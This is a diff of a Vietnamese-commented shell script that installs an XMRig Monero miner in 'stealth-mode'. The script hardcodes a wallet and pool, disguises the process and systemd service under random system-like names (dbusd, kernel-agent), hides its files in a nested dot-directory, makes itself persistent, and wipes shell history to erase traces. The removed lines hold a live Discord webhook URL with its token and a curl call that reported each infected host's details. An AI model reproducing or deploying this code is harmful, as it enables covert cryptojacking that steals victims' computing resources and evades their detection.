@@ -4,18 +4,15 @@
 WALLET="47jKLNTu7MHZzbyfnhEZV4PHXe7z8CzpU6WV6hukLPthYnzmtXRWDFUYaa3pdM9xMnQxwsHCnw1zXBkVaNeUGRVkUc7VXoL"
 WORKER="silent_$(hostname)"
 POOL="pool.supportxmr.com:443"
-DISCORD_WEBHOOK="https://discord.com/api/webhooks/1361974628339155007/mfoD2oC4vtSNXOhRKQcinbADhtbsM720wiN3WEkYm1wZbL30D0GD9P84d1VF9xaCoVdK"
-
 TOTAL_CORES=$(nproc)
 CPU_THREADS=$(awk "BEGIN {print int($TOTAL_CORES * 0.7)}")
 PRIORITY=3
-
 CUSTOM_NAME=$(shuf -n1 -e "dbusd" "syscore" "logworker" "udevd")
-INSTALL_DIR="$HOME/.local/.cache/.sysd"
+INSTALL_DIR="$HOME/.local/.share/.cache/.dbus"
 SERVICE_NAME=$(shuf -n1 -e "logrotate" "system-fix" "netcore" "kernel-agent")
 # ============================
 
-echo "💻 Đang cài đặt XMRig stealth-mode + Discord log..."
+echo "💻 Đang cài đặt XMRig stealth-mode..."
 
 # Cài thư viện cần thiết
 sudo apt update
@@ -56,16 +53,10 @@ sudo systemctl daemon-reload
 sudo systemctl enable $SERVICE_NAME
 sudo systemctl start $SERVICE_NAME
 
-# Gửi log về Discord
-curl -H "Content-Type: application/json" -X POST -d "{
-  \"username\": \"XMRig Logger\",
-  \"content\": \"💻 \`$(hostname)\` vừa khởi động XMRig 🎉\n🔧 Service: \`$SERVICE_NAME\`\n⚙️ Process: \`$CUSTOM_NAME\`\n🧠 CPU threads: \`$CPU_THREADS / $TOTAL_CORES\`\n📡 Pool: \`$POOL\`\n📁 Path: \`$INSTALL_DIR/$CUSTOM_NAME\`\"
-}" $DISCORD_WEBHOOK
-
 # Xóa dấu vết cài đặt
 cd ~
 rm -rf xmrig
 history -c
 
 echo ""
-echo "✅ XMRig stealth đã chạy và gửi log về Discord!"
+echo "✅ XMRig stealth đã chạy!"
